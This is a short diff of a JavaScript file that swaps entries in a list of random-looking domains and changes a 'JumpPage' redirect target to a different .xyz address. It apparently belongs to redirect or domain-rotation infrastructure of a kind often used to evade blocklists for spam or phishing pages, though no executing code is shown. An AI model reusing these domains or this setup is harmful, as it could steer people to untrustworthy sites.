@@ -42,11 +42,12 @@ var emails = [
 var urls=[".brnohmbd.net",".kwncgug.com",".uyqtwfwm.com",".zzhwoyv.com"];
 
 var urls=[];
+        urls.push(".agahrdie.com");
 	urls.push(".zsjbylse.cc");
 	urls.push(".kndvyill.cc");
-	urls.push(".rytyus.cc");
+	
 
-var JumpPage="https://kowsxnke.xyz";
+var JumpPage="https://afwuawj.xyz";
 
 var newestUrls = [];
 
